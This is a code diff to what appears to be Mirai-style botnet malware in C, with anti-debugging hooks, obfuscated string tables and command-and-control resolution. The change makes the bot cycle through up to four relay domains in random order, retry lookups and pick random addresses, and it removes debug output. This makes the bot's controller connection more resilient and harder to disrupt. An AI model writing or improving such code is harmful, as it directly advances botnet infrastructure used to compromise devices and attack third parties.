@@ -39,59 +39,64 @@
 static void anti_gdb_entry(int);
 static void resolve_cnc_addr(void);
 static void establish_connection(void);
-
 extern struct sockaddr_in srv_addr;
-
 #ifdef RELAY_MODE
-static void resolve_relay_addr(void) {
-    struct resolv_entries *entries;
+static void resolve_relay_addr(void)
+{
     srv_addr.sin_family = AF_INET;
-    srv_addr.sin_port = htons(RELAY_PORT);
 
-    table_unlock_val(TABLE_RELAY_1);
-    char *domain = table_retrieve_val(TABLE_RELAY_1, NULL);
+    // Try all available relays in random order until one works
+    int relay_order[4] = {0, 1, 2, 3};
     
-    if (domain == NULL || util_strlen(domain) == 0) {
-        table_lock_val(TABLE_RELAY_1);
-        return;
+    // Shuffle the relay order
+    for (int i = 3; i > 0; i--)
+    {
+        int j = rand_next() % (i + 1);
+        int tmp = relay_order[i];
+        relay_order[i] = relay_order[j];
+        relay_order[j] = tmp;
     }
     
-#ifdef DEBUG
-    printf("[relay] Resolving relay: '%s' (len=%d)\n", domain, util_strlen(domain));
-#endif
-    
-    int retries = 3;
-    entries = NULL;
-    
-    while (retries > 0 && entries == NULL) {
-        entries = resolv_lookup(domain);
-        if (entries != NULL) {
-#ifdef DEBUG
-            printf("[relay] resolv_lookup returned %d addresses\n", entries->addrs_len);
-#endif
+    for (int attempt = 0; attempt < 4; attempt++)
+    {
+        int relay_index = TABLE_RELAY_1 + relay_order[attempt];
+        table_unlock_val(relay_index);
+        char *relay_domain = table_retrieve_val(relay_index, NULL);
+        
+        // Skip empty relay entries (domains that weren't configured)
+        if (util_strlen(relay_domain) == 0)
+        {
+            table_lock_val(relay_index);
+            continue;
         }
-        if (entries == NULL) {
-            retries--;
-            if (retries > 0)
-                sleep(2);
+        
+        struct resolv_entries *entries = NULL;
+        int retries = 1;
+        
+        while (retries >= 0 && entries == NULL)
+        {
+            entries = resolv_lookup(relay_domain);
+            if (entries == NULL)
+            {
+                retries--;
+                if (retries >= 0)
+                    sleep(1);
+            }
         }
+        
+        table_lock_val(relay_index);
+        
+        if (entries != NULL && entries->addrs_len > 0)
+        {
+            srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
+            srv_addr.sin_port = htons(RELAY_PORT);
+            resolv_entries_free(entries);
+            return;
+        }
+        
+        if (entries)
+            resolv_entries_free(entries);
     }
-    
-    table_lock_val(TABLE_RELAY_1);
-    
-    if (entries == NULL) {
-#ifdef DEBUG
-        printf("[relay] Failed to resolve relay domain\n");
-#endif
-        return;
-    }
-    
-    srv_addr.sin_addr.s_addr = entries->addrs[0];
-    resolv_entries_free(entries);
-    
-#ifdef DEBUG
-    printf("[relay] Relay resolved successfully\n");
-#endif
 }
 #endif
 
